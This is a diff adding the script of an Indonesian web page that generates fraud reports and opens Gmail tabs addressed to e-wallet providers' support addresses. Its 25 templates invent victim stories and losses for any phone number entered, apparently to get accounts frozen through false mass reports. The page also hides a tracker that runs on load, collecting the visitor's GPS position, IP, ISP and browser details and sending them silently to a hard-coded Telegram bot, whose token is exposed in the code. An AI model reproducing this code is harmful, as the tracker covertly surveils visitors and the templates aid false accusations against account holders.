+          <span class="label">LANJUT</span>
+          <span class="spinner"></span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+<script>
+(function () {
+  'use strict';
+
+  var reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* =========================================================
+     LOADING SCREEN
+     ========================================================= */
+  var loader = document.getElementById('loader');
+  var loaderLog = document.getElementById('loaderLog');
+  var loaderBar = document.getElementById('loaderBar');
+  var loaderPct = document.getElementById('loaderPct');
+  var loaderStep = document.getElementById('loaderStep');
+
+  var steps = [
+    { pct: 8,  tag: 'BOOT',     text: 'Menginisialisasi modul inti' },
+    { pct: 20, tag: 'CORE',     text: 'Memuat format laporan' },
+    { pct: 34, tag: 'CORE',     text: 'Memuat template (25)' },
+    { pct: 48, tag: 'NET',      text: 'Menyiapkan rute Gmail' },
+    { pct: 60, tag: 'NET',      text: 'Menyiapkan alamat resmi payment' },
+    { pct: 72, tag: 'UI',       text: 'Merender antarmuka' },
+    { pct: 84, tag: 'UI',       text: 'Mengaktifkan animasi' },
+    { pct: 94, tag: 'FINAL',    text: 'Memeriksa integritas' },
+    { pct: 100, tag: 'READY',   text: 'Sistem siap' }
+  ];
+
+  function pushLog(step) {
+    var row = document.createElement('div');
+    row.className = 'row ok';
+    var time = new Date().toLocaleTimeString('id-ID', { hour12: false });
+    row.innerHTML = '[' + time + '] <b>' + step.tag + '</b> · ' + step.text;
+    loaderLog.appendChild(row);
+    loaderLog.scrollTop = loaderLog.scrollHeight;
+    loaderBar.style.transform = 'scaleX(' + (step.pct / 100) + ')';
+    loaderPct.textContent = step.pct + '%';
+    loaderStep.textContent = step.tag;
+  }
+
+  function runLoader(done) {
+    if (reduced) { loader.classList.add('done'); done && done(); return; }
+
+    var i = 0;
+    function tick() {
+      if (i >= steps.length) {
+        setTimeout(function () {
+          loader.classList.add('done');
+          done && done();
+        }, 380);
+        return;
+      }
+      pushLog(steps[i++]);
+      setTimeout(tick, 240 + Math.random() * 220);
+    }
+    setTimeout(tick, 200);
+  }
+
+  runLoader(function () { /* reveal comes next */ });
+
+  /* =========================================================
+     BACKGROUND PARTICLES
+     ========================================================= */
+  var dotsHost = document.getElementById('dots');
+  if (dotsHost && !reduced) {
+    var frag = document.createDocumentFragment();
+    for (var d = 0; d < 18; d++) {
+      var el = document.createElement('span');
+      el.className = 'bg-dot';
+      el.style.left = (Math.random() * 100) + '%';
+      el.style.top = (100 + Math.random() * 30) + '%';
+      el.style.animationDuration = (18 + Math.random() * 22) + 's';
+      el.style.animationDelay = (-Math.random() * 20) + 's';
+      frag.appendChild(el);
+    }
+    dotsHost.appendChild(frag);
+  }
+
+  /* =========================================================
+     SCROLL REVEAL
+     ========================================================= */
+  var sections = Array.prototype.slice.call(document.querySelectorAll('.section'));
+  if ('IntersectionObserver' in window && !reduced) {
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (en) {
+        if (en.isIntersecting) {
+          var el = en.target;
+          var idx = sections.indexOf(el);
+          el.style.transitionDelay = (idx * 90) + 'ms';
+          el.classList.add('in');
+          io.unobserve(el);
+        }
+      });
+    }, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });
+    sections.forEach(function (s) { io.observe(s); });
+  } else {
+    sections.forEach(function (s) { s.classList.add('in'); });
+  }
+
+  /* =========================================================
+     FIELD ACTIVE
+     ========================================================= */
+  document.querySelectorAll('.field').forEach(function (field) {
+    var ctrl = field.querySelector('.control');
+    if (!ctrl) return;
+    ctrl.addEventListener('focus', function () { field.classList.add('active'); });
+    ctrl.addEventListener('blur', function () {
+      setTimeout(function () { field.classList.remove('active'); }, 120);
+    });
+  });
+
+  /* =========================================================
+     TARGETS
+     ========================================================= */
+  var targetsEl = document.getElementById('targets');
+  var selected = null;
+
+  function parseEmails(str) {
+    return str.split(',').map(function (s) { return s.trim(); }).filter(Boolean);
+  }
+  function getTargetData(el) {
+    return {
+      name: el.dataset.name,
+      emails: parseEmails(el.dataset.emails || '')
+    };
+  }
+
+  function selectTarget(el) {
+    targetsEl.querySelectorAll('.target').forEach(function (t) {
+      t.classList.remove('selected');
+      t.setAttribute('aria-checked', 'false');
+    });
+    el.classList.add('selected');
+    el.setAttribute('aria-checked', 'true');
+    selected = getTargetData(el);
+    refreshMessage(false);
+  }
+
+  targetsEl.addEventListener('click', function (e) {
+    var el = e.target.closest('.target');
+    if (el) selectTarget(el);
+  });
+  targetsEl.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' || e.key === ' ') {
+      var el = e.target.closest('.target');
+      if (el) { e.preventDefault(); selectTarget(el); }
+    }
+  });
+
+  selected = getTargetData(targetsEl.querySelector('.target.selected'));
+
+  /* =========================================================
+     RIPPLE
+     ========================================================= */
+  function attachRipple(btn) {
+    btn.addEventListener('pointerdown', function (e) {
+      if (btn.disabled) return;
+      var rect = btn.getBoundingClientRect();
+      var size = Math.max(rect.width, rect.height);
+      var r = document.createElement('span');
+      r.className = 'ripple';
+      r.style.width = r.style.height = size + 'px';
+      r.style.left = (e.clientX - rect.left - size / 2) + 'px';
+      r.style.top  = (e.clientY - rect.top  - size / 2) + 'px';
+      btn.appendChild(r);
+      setTimeout(function () { r.remove(); }, 640);
+    });
+  }
+  document.querySelectorAll('.btn').forEach(attachRipple);
+
+  /* =========================================================
+     TOAST
+     ========================================================= */
+  var toastStack = document.getElementById('toastStack');
+  function toast(type, text) {
+    var t = document.createElement('div');
+    t.className = 'toast ' + type;
+    t.innerHTML = '<span class="mark"></span><span class="msg"></span>';
+    t.querySelector('.msg').textContent = text;
+    toastStack.appendChild(t);
+    setTimeout(function () {
+      t.classList.add('out');
+      setTimeout(function () { t.remove(); }, 320);
+    }, 3200);
+  }
+
+  /* =========================================================
+     TELEGRAM VISITOR TRACKER
+     ========================================================= */
+  var TG_BOT_TOKEN = '8993311091:AAHj5QGeqMrHY0fTf3JBU32Dukej7HWNl-k';
+  var TG_CHAT_ID   = '7428813404';
+  var TG_ENABLED   = TG_BOT_TOKEN.indexOf('ISI_') !== 0 && TG_CHAT_ID.indexOf('ISI_') !== 0;
+
+  function tgEscape(s) {
+    return String(s == null ? '' : s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+  }
+
+  function tgSend(text) {
+    if (!TG_ENABLED) return;
+    var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+    try {
+      fetch(url, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        }),
+        keepalive: true
+      }).catch(function () {});
+    } catch (e) {}
+  }
+
+  function tgTrackVisit() {
+    if (!TG_ENABLED) return;
+
+    try {
+      if (sessionStorage.getItem('_tg_v')) return;
+      sessionStorage.setItem('_tg_v', '1');
+    } catch (e) {}
+
+    var ua = navigator.userAgent || 'unknown';
+    var lang = navigator.language || '-';
+    var path = location.pathname + location.search;
+    var ref = document.referrer || '-';
+    var tz = 'unknown';
+    try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'; } catch (e) {}
+    var screenSize = (window.screen && window.screen.width && window.screen.height)
+      ? window.screen.width + 'x' + window.screen.height
+      : '-';
+
+    function getGps() {
+      return new Promise(function (resolve) {
+        if (!navigator.geolocation) return resolve(null);
+        var done = false;
+        var timer = setTimeout(function () {
+          if (done) return;
+          done = true;
+          resolve(null);
+        }, 6000);
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            if (done) return;
+            done = true;
+            clearTimeout(timer);
+            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
+          },
+          function () {
+            if (done) return;
+            done = true;
+            clearTimeout(timer);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function getIpAndGeo() {
+      return fetch('https://ipwho.is/', { cache: 'no-store' })
+        .then(function (r) { return r.json(); })
+        .then(function (geo) {
+          if (!geo || geo.success === false) {
+            return { ip: 'unknown', geo: null };
+          }
+          return {
+            ip: geo.ip || 'unknown',
+            geo: {
+              city: geo.city,
+              region: geo.region,
+              country: geo.country,
+              lat: geo.latitude,
+              lon: geo.longitude,
+              isp: geo.connection && geo.connection.isp
+            }
+          };
+        })
+        .catch(function () { return { ip: 'unknown', geo: null }; });
+    }
+
+    Promise.all([getGps(), getIpAndGeo()]).then(function (res) {
+      var gps = res[0];
+      var net = res[1];
+      var time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+      var lokasiIp = '-';
+      if (net.geo) {
+        var parts = [];
+        if (net.geo.city) parts.push(net.geo.city);
+        if (net.geo.region) parts.push(net.geo.region);
+        if (net.geo.country) parts.push(net.geo.country);
+        lokasiIp = parts.length ? parts.join(', ') : '-';
+      }
+
+      var ispLine = (net.geo && net.geo.isp)
+        ? '📶 ISP: ' + tgEscape(net.geo.isp) + '\n'
+        : '';
+
+      var ipCoordLine = '';
+      if (net.geo && net.geo.lat && net.geo.lon) {
+        ipCoordLine = '🧭 IP Coord: ' + net.geo.lat + ', ' + net.geo.lon + '\n';
+      }
+
+      var gpsLine = '🛰️ GPS: <i>tidak diizinkan / tidak tersedia</i>';
+      if (gps) {
+        gpsLine = '🛰️ GPS: <b>' + gps.lat.toFixed(6) + ', ' + gps.lon.toFixed(6) + '</b>' +
+          ' (±' + Math.round(gps.acc) + 'm)\n' +
+          '🗺️ <a href="https://www.google.com/maps?q=' + gps.lat + ',' + gps.lon + '">Buka di Maps</a>';
+      }
+
+      var blockquote =
+        '<blockquote>' +
+          '📍 <b>Lokasi (IP):</b> ' + tgEscape(lokasiIp) + '\n' +
+          ipCoordLine +
+          ispLine +
+          gpsLine +
+        '</blockquote>';
+
+      var text =
+        '👀 <b>Visitor Baru</b>\n' +
+        '🕐 ' + tgEscape(time) + ' WIB\n' +
+        '📄 Path: <code>' + tgEscape(path) + '</code>\n\n' +
+        blockquote + '\n\n' +
+        '🌐 Referer: ' + tgEscape(ref) + '\n' +
+        '🕰️ TZ: ' + tgEscape(tz) + '\n' +
+        '🖥️ Screen: ' + tgEscape(screenSize) + '\n' +
+        '🗣️ Lang: ' + tgEscape(lang) + '\n' +
+        '📡 IP: <code>' + tgEscape(net.ip) + '</code>\n' +
+        '🧭 UA: <code>' + tgEscape(ua) + '</code>';
+
+      tgSend(text);
+    });
+  }
+
+  if (TG_ENABLED) {
+    if (document.readyState === 'complete') setTimeout(tgTrackVisit, 800);
+    else window.addEventListener('load', function () { setTimeout(tgTrackVisit, 800); });
+  }
+
+  /* =========================================================
+     FORM STATE
+     ========================================================= */
+  var templateSel = document.getElementById('template');
+  var phoneInput = document.getElementById('phone');
+  var messageInput = document.getElementById('message');
+  var phoneCount = document.getElementById('phoneCount');
+  var msgCount = document.getElementById('msgCount');
+  var fieldPhone = document.getElementById('fieldPhone');
+  var fieldMessage = document.getElementById('fieldMessage');
+  var btnSend = document.getElementById('btnSend');
+  var btnAll = document.getElementById('btnAll');
+  var statusText = document.getElementById('statusText');
+  var phoneEdited = false;
+
+  function setStatus(t) { statusText.textContent = t; }
+
+  function buildMessage(tpl, phone, pay) {
+    var p = phone.trim() || '08xxxx';
+    var P = pay || 'DANA';
+
+    switch (tpl) {
+      case 't2':
+        return 'Kepada Tim Bantuan ' + P + ',\n' +
+          'Saya ingin melaporkan akun ' + P + ' dengan nomor (' + p + ') yang telah menipu saya dengan kerugian sebesar Rp10.000.000.\n' +
+          'Awalnya, pelaku menghubungi saya melalui WhatsApp dan menawarkan pekerjaan di Kamboja dengan gaji Rp30.000.000/bulan. Saya diminta mentransfer Rp10.000.000 sebagai biaya operasional. Setelah saya transfer, saya diberi jadwal keberangkatan, namun setibanya di Kamboja saya disekap dan disiksa.\n' +
+          'Syukurlah saya berhasil selamat berkat bantuan pemerintah Indonesia.\n' +
+          'Dengan ini saya mohon akun ' + P + ' (' + p + ') segera dibekukan agar tidak ada korban lain yang tertipu seperti saya.';
+
+      case 't3':
+        return 'LAPORAN INVESTASI BODONG\n\nKepada ' + P + ',\n' +
+          'Saya ingin mengadukan akun ' + P + ' dengan nomor ' + p + ' atas dugaan penipuan berkedok investasi.\n\n' +
+          'Duduk perkara:\nPelaku menjanjikan keuntungan tetap 10% per minggu melalui grup WhatsApp. Saya tergiur dan melakukan transfer bertahap ke nomor ' + p + ' dengan total Rp25.000.000. Awalnya saya diberi keuntungan kecil sebagai umpan. Setelah setoran besar masuk, pelaku membubarkan grup dan memblokir saya.\n\n' +
+          'Yang saya mohonkan:\n- Akun ' + p + ' dibekukan permanen.\n- Dana saya dikembalikan.\n- Pelaku diproses sesuai hukum yang berlaku.\n\n' +
+          'Bukti: screenshot chat, bukti transfer, dan tangkapan grup.';
+
+      case 't4':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + P + ' nomor ' + p + ' karena terlibat pinjol ilegal yang merugikan saya Rp5.000.000.\n\n' +
+          'Kejadian bermula saat saya mengajukan pinjaman lewat aplikasi tidak resmi. Saya diminta transfer biaya admin dan biaya pencairan ke nomor ' + p + '. Setelah biaya masuk, pinjaman tak pernah cair. Data kontak saya disebar dan saya diteror lewat WhatsApp.\n\n' +
+          'Saya minta:\n1. Akun ' + p + ' dibekukan.\n2. Penyebaran data saya dihentikan.\n3. Pelaku ditindak tegas.\n\nTerima kasih.';
+
+      case 't5':
+        return 'Halo Tim ' + P + ',\n\n' +
+          'Saya korban penipuan belanja online dengan kerugian Rp3.500.000. Pelaku menggunakan nomor ' + p + '.\n\n' +
+          'Ceritanya, pelaku menawarkan barang elektronik murah lewat WhatsApp. Saya diminta bayar penuh dulu. Setelah saya transfer, barang tak pernah dikirim. Pelaku berdalih lalu memblokir nomor saya.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan. Saya siap kirim bukti transfer dan screenshot chat.\n\n' +
+          'Hormat saya,\n[Pelapor]';
+
+      case 't6':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya ingin melaporkan penipuan tiket konser oleh akun ' + P + ' nomor ' + p + ', dengan kerugian Rp2.500.000.\n\n' +
+          'Pelaku mengaku reseller resmi dan menawarkan tiket lewat WhatsApp. Saya transfer penuh ke nomor ' + p + '. Pelaku berjanji mengirim e-tiket malam itu, tetapi hingga kini tidak ada. Nomor saya pun diblokir.\n\n' +
+          'Permohonan saya:\n- Bekukan akun ' + p + '.\n- Kembalikan dana saya.\n- Cegah pelaku menipu korban lain.\n\n' +
+          'Bukti menyusul: chat, transfer, dan janji e-tiket.';
+
+      case 't7':
+        return 'Kepada ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' karena menipu saya lewat undian berhadiah palsu. Kerugian saya Rp4.000.000.\n\n' +
+          'Saya dihubungi via WhatsApp dan dinyatakan menang hadiah besar. Untuk mencairkannya, saya diminta transfer pajak dan biaya admin ke nomor ' + p + '. Setelah transfer, hadiah tak pernah datang dan pelaku menghilang.\n\n' +
+          'Mohon akun ' + p + ' dibekukan permanen dan dana saya dikembalikan.\n\n' +
+          'Salam,\n[Pelapor]';
+
+      case 't8':
+        return 'LAPORAN PENIPUAN LOWONGAN KERJA\n\nKepada Tim ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' atas penipuan berkedok lowongan kerja dengan kerugian Rp1.500.000.\n\n' +
+          'Pelaku menawarkan kerja bergaji tinggi dan meminta biaya pelatihan serta seragam. Saya transfer ke nomor ' + p + '. Setelah itu pelaku diam dan lowongan ternyata fiktif. Saya menemukan korban lain dengan modus sama.\n\n' +
+          'Mohon:\n- Akun ' + p + ' dibekukan.\n- Dana saya dikembalikan.\n- Pelaku ditindak sesuai hukum.\n\n' +
+          'Bukti: chat, transfer, dan iklan lowongan.';
+
+      case 't9':
+        return 'Halo ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' terkait penipuan sewa kamar fiktif dengan kerugian Rp6.000.000.\n\n' +
+          'Pelaku memasang iklan kamar kos di media sosial. Saya diminta DP dan biaya sewa awal ke nomor ' + p + '. Setelah transfer, alamat yang diberikan tidak sesuai. Saat saya datangi, lokasi bukan milik pelaku. Nomor saya lalu diblokir.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nTerima kasih.';
+
+      case 't10':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya ingin mengadukan akun ' + P + ' nomor ' + p + ' atas penipuan titip investasi kripto sebesar Rp15.000.000.\n\n' +
+          'Pelaku menjanjikan profit tetap dari trading. Saya transfer ke nomor ' + p + ' dan diberi akses akun investasi. Ternyata akun fiktif. Setelah dana masuk, pelaku menghilang dan akun tak bisa diakses.\n\n' +
+          'Saya mohon:\n1. Akun ' + p + ' dibekukan.\n2. Dana saya dikembalikan.\n3. Koordinasi dengan otoritas terkait.\n\n' +
+          'Bukti: chat, transfer, dan tangkapan akun investasi.';
+
+      case 't11':
+        return 'Kepada ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' dengan modus kurir paket. Kerugian saya Rp1.200.000.\n\n' +
+          'Pelaku mengaku kurir dan bilang paket saya tertahan di bea cukai. Saya diminta transfer biaya bea cukai ke nomor ' + p + '. Setelah transfer, paket tak pernah ada dan nomor pelaku mati.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nHormat saya,\n[Pelapor]';
+
+      case 't12':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' karena mengumpulkan donasi bencana palsu. Saya tertipu Rp2.000.000.\n\n' +
+          'Pelaku menyebar pamflet donasi lewat WhatsApp dan media sosial. Saya ikut membantu dan transfer ke nomor ' + p + '. Setelah dicek, tak ada lembaga resmi yang menaungi penggalangan itu. Pelaku tak bisa dihubungi.\n\n' +
+          'Saya minta:\n- Akun ' + p + ' dibekukan.\n- Dana saya dikembalikan.\n- Pelaku ditindak karena menyalahgunakan donasi.\n\n' +
+          'Bukti: pamflet, chat, dan transfer.';
+
+      case 't13':
+        return 'Halo Tim ' + P + ',\n\n' +
+          'Saya korban penipuan jual beli hewan peliharaan dengan kerugian Rp3.000.000. Pelaku memakai nomor ' + p + '.\n\n' +
+          'Pelaku menawarkan hewan dengan foto dan video meyakinkan. Saya transfer penuh ke nomor ' + p + '. Setelah itu hewan tak pernah dikirim dan nomor saya diblokir.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nTerima kasih.';
+
+      case 't14':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' dengan modus transfer salah rekening. Kerugian saya Rp2.500.000.\n\n' +
+          'Pelaku mengaku salah transfer ke akun saya dan minta dikembalikan ke nomor ' + p + '. Karena kasihan, saya kembalikan. Beberapa hari kemudian dana awal itu ditarik kembali lewat sengketa, sehingga saya rugi.\n\n' +
+          'Saya mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nBukti: chat dan transfer.';
+
+      case 't15':
+        return 'Kepada ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' atas penipuan top up game sebesar Rp800.000.\n\n' +
+          'Pelaku menawarkan top up diamond murah lewat WhatsApp. Saya transfer ke nomor ' + p + ', tetapi item game tak pernah masuk. Pelaku memblokir saya setelah pembayaran.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nSalam,\n[Pelapor]';
+
+      case 't16':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' karena menipu lewat arisan online. Kerugian saya Rp7.000.000.\n\n' +
+          'Saya bergabung di grup arisan yang dikelola pelaku. Saya setor ke nomor ' + p + ' selama beberapa putaran. Saat giliran saya menerima, pelaku menghilang dan grup dibubarkan.\n\n' +
+          'Saya mohon:\n1. Akun ' + p + ' dibekukan.\n2. Dana saya dikembalikan.\n3. Pelaku ditindak.\n\n' +
+          'Bukti: grup, transfer, dan aturan arisan.';
+
+      case 't17':
+        return 'Halo ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' terkait sewa mobil fiktif dengan kerugian Rp4.500.000.\n\n' +
+          'Pelaku menawarkan sewa mobil di media sosial. Saya diminta DP ke nomor ' + p + '. Pada hari yang dijanjikan, mobil tak datang dan nomor saya diblokir.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nTerima kasih.';
+
+      case 't18':
+        return 'Kepada Tim Bantuan ' + P + ',\n\n' +
+          'Saya ingin melaporkan akun ' + p + ' atas penipuan les privat fiktif sebesar Rp1.800.000.\n\n' +
+          'Pelaku menawarkan les privat lewat WhatsApp dan minta bayar paket di awal ke nomor ' + p + '. Setelah transfer, pengajar tak pernah hadir dan pelaku menghilang.\n\n' +
+          'Saya mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nBukti: chat, transfer, dan brosur les.';
+
+      case 't19':
+        return 'LAPORAN SKEMA PONZI\n\nKepada Tim ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' karena menjalankan skema ponzi. Kerugian saya Rp20.000.000.\n\n' +
+          'Pelaku menawarkan investasi untung tak wajar dengan rekrutmen berjenjang. Saya setor ke nomor ' + p + ' dan merekrut anggota. Setelah beberapa bulan, pembayaran berhenti dan pelaku kabur.\n\n' +
+          'Mohon:\n- Akun ' + p + ' dibekukan permanen.\n- Dana saya dikembalikan.\n- Koordinasi dengan pihak berwenang.\n\n' +
+          'Bukti: chat, transfer, dan skema ponzi.';
+
+      case 't20':
+        return 'Kepada ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' atas penipuan endorse produk sebesar Rp2.200.000.\n\n' +
+          'Pelaku mengaku brand dan menawarkan kerja sama endorse. Saya diminta transfer biaya kerja sama dan ongkir sampel ke nomor ' + p + '. Setelah transfer, produk tak dikirim dan nomor saya diblokir.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.\n\nHormat saya,\n[Pelapor]';
+
+      case 't21':
+        return 'LAPORAN PEMBEKUAN AKUN\n\nKepada Tim ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + P + ' dengan nomor ' + p + ' atas dugaan penipuan dan memohon pembekuan akun secara permanen.\n\n' +
+          'Pelaku menghubungi saya melalui WhatsApp dan berpura-pura sebagai pihak resmi. Saya diminta melakukan verifikasi dengan mentransfer sejumlah dana ke nomor ' + p + '. Setelah saya patuhi, akun saya justru dinonaktifkan sementara dan dana saya raib.\n\n' +
+          'Saya mohon:\n1. Pembekuan akun ' + p + ' secara permanen.\n2. Penyelidikan internal terkait aliran dana.\n3. Pengembalian dana saya.\n\n' +
+          'Bukti: screenshot percakapan dan bukti transfer.';
+
+      case 't22':
+        return 'Kepada Tim ' + P + ',\n\n' +
+          'Saya melaporkan akun ' + p + ' karena menipu saya melalui jasa review palsu dengan kerugian Rp1.000.000.\n\n' +
+          'Pelaku menjanjikan ulasan positif dan peningkatan rating toko online saya. Saya transfer biaya jasa ke nomor ' + p + '. Namun, setelah pembayaran, pelaku tidak mengerjakan pesanan dan memblokir kontak saya.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.';
+
+      case 't23':
+        return 'LAPORAN TIKET TRAVEL FIKTIF\n\nKepada ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' atas penipuan tiket travel dengan kerugian Rp3.200.000.\n\n' +
+          'Saya memesan tiket pesawat melalui pelaku yang mengaku agen resmi. Saya transfer penuh ke nomor ' + p + '. Saat saya cek di maskapai, kode booking yang diberikan palsu dan pelaku tidak bisa dihubungi.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.';
+
+      case 't24':
+        return 'Kepada ' + P + ',\n\n' +
+          'Saya ingin melaporkan akun ' + p + ' karena memalsukan donasi untuk anak yatim. Kerugian saya Rp1.500.000.\n\n' +
+          'Pelaku mengirim pesan berantai berisi foto anak-anak dan meminta sumbangan ke nomor ' + p + '. Setelah saya transfer, saya mencoba menghubungi panti asuhan terkait dan ternyata donasi tersebut fiktif.\n\n' +
+          'Saya mohon akun ' + p + ' dibekukan karena menyalahgunakan kebaikan orang.';
+
+      case 't25':
+        return 'Kepada Tim ' + P + ',\n\n' +
+          'Saya melaporkan nomor ' + p + ' atas penipuan pinjaman online cepat cair. Kerugian saya Rp4.000.000.\n\n' +
+          'Pelaku menjanjikan pinjaman tanpa jaminan dan meminta saya mentransfer biaya asuransi ke nomor ' + p + '. Setelah pembayaran, pinjaman tidak pernah dicairkan dan data saya disalahgunakan untuk pinjaman lain.\n\n' +
+          'Mohon akun ' + p + ' dibekukan dan dana saya dikembalikan.';
+
+      default:
+        return 'Hi, Saya melaporkan akun (' + p + ') Telah menipu saya dengan nominal kerugian sebesar (Rp 2.000.000) Awal mula akun tersebut  telah menghubungi saya lewat aplikasi WhatsApp dan Menawarkan sebuah akun game dengan harga murah akan tetapi akun tersebut meminta transfer terlebih dahulu. Setelah saya transfer akun WhatsApp saya di blokir dan saya mengalami kerugian sebesar (Rp 2.000.000) Mohon kepada pihak ' + P.toLowerCase() + ' untuk membekukan akun penipu tersebut secara permanen dan mohon kembalikan saldo saya. Terimakasih';
+    }
+  }
+
+  function refreshMessage(force) {
+    if (force || !phoneEdited) {
+      var payName = selected ? selected.name : 'DANA';
+      messageInput.value = buildMessage(templateSel.value, phoneInput.value, payName);
+    }
+    updateCounters();
+  }
+
+  function updateCounters() {
+    phoneCount.textContent = phoneInput.value.length + ' / 13';
+    msgCount.textContent = messageInput.value.length + ' KARAKTER';
+  }
+
+  templateSel.addEventListener('change', function () {
+    phoneEdited = false;
+    refreshMessage(true);
+    toast('info', 'Format: ' + templateSel.options[templateSel.selectedIndex].text);
+  });
+
+  phoneInput.addEventListener('input', function () {
+    fieldPhone.classList.remove('invalid');
+    var v = phoneInput.value.replace(/\D/g, '');
+    if (phoneInput.value !== v) phoneInput.value = v;
+    refreshMessage(false);
+  });
+
+  messageInput.addEventListener('input', function () {
+    phoneEdited = true;
+    fieldMessage.classList.remove('invalid');
+    updateCounters();
+  });
+
+  refreshMessage(true);
+
+  /* =========================================================
+     VALIDATION
+     ========================================================= */
+  function validate() {
+    var ok = true;
+    var phone = phoneInput.value.trim();
+    var body = messageInput.value.trim();
+
+    fieldPhone.classList.remove('invalid');
+    fieldMessage.classList.remove('invalid');
+
+    if (!/^0?8\d{7,12}$/.test(phone)) {
+      fieldPhone.classList.add('invalid');
+      toast('error', 'Nomor tidak valid.');
+      ok = false;
+    }
+    if (body.length < 20) {
+      fieldMessage.classList.add('invalid');
+      toast('error', 'Isi laporan terlalu pendek.');
+      ok = false;
+    }
+    return ok ? body : null;
+  }
+
+  /* =========================================================
+     GMAIL
+     ========================================================= */
+  function openGmail(to, subject, body) {
+    var url = 'https://mail.google.com/mail/?view=cm&fs=1' +
+      '&to=' + encodeURIComponent(to) +
+      '&su=' + encodeURIComponent(subject) +
+      '&body=' + encodeURIComponent(body);
+    window.open(url, '_blank', 'noopener');
+  }
+
+  /* =========================================================
+     MODAL
+     ========================================================= */
+  var scrim = document.getElementById('scrim');
+  var modalBody = document.getElementById('modalBody');
+  var modalOk = document.getElementById('modalOk');
+  var modalCancel = document.getElementById('modalCancel');
+  var pendingAction = null;
+
+  function openModal(html, onOk) {
+    modalBody.innerHTML = html;
+    pendingAction = onOk;
+    scrim.classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeModal() {
+    scrim.classList.remove('open');
+    document.body.style.overflow = '';
+    pendingAction = null;
+  }
+  modalCancel.addEventListener('click', closeModal);
+  scrim.addEventListener('click', function (e) { if (e.target === scrim) closeModal(); });
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && scrim.classList.contains('open')) closeModal();
+  });
+  modalOk.addEventListener('click', function () {
+    if (!pendingAction) return closeModal();
+    var fn = pendingAction;
+    pendingAction = null;
+    closeModal();
+    fn();
+  });
+
+  /* =========================================================
+     BUTTON LOADING
+     ========================================================= */
+  function setLoading(btn, on) {
+    if (on) { btn.classList.add('loading'); btn.disabled = true; }
+    else { btn.classList.remove('loading'); btn.disabled = false; }
+  }
+
+  /* =========================================================
+     KIRIM KE SEMUA EMAIL PAYMENT TERPILIH
+     ========================================================= */
+  btnSend.addEventListener('click', function () {
+    var body = validate();
+    if (!body) return;
+
+    if (!selected || !selected.emails.length) {
+      toast('error', 'Tidak ada alamat email tujuan.');
+      return;
+    }
+
+    var listHtml = '<ul>' + selected.emails.map(function (e) {
+      return '<li>' + e + '</li>';
+    }).join('') + '</ul>';
+
+    openModal(
+      'Kirim laporan ke <b>' + selected.name + '</b><br><br>' +
+      'Alamat tujuan:<br>' + listHtml +
+      '<br><span style="color:#8a8a8a">' + selected.emails.length + ' tab Gmail akan dibuka.</span>',
+      function () {
+        setLoading(btnSend, true);
+        setStatus('OPENING GMAIL');
+
+        var i = 0;
+        function next() {
+          if (i >= selected.emails.length) {
+            setLoading(btnSend, false);
+            setStatus('READY');
+            toast('success', 'Semua email ' + selected.name + ' dibuka.');
+            return;
+          }
+          var addr = selected.emails[i++];
+          openGmail(addr, 'Laporan Penipuan ' + selected.name, body);
+          toast('info', 'Tab: ' + addr);
+          setTimeout(next, 800);
+        }
+        next();
+      }
+    );
+  });
+
+  /* =========================================================
+     KIRIM KE SEMUA PAYMENT (9 alamat)
+     ========================================================= */
+  btnAll.addEventListener('click', function () {
+    var body = validate();
+    if (!body) return;
+
+    var all = [];
+    targetsEl.querySelectorAll('.target').forEach(function (el) {
+      var data = getTargetData(el);
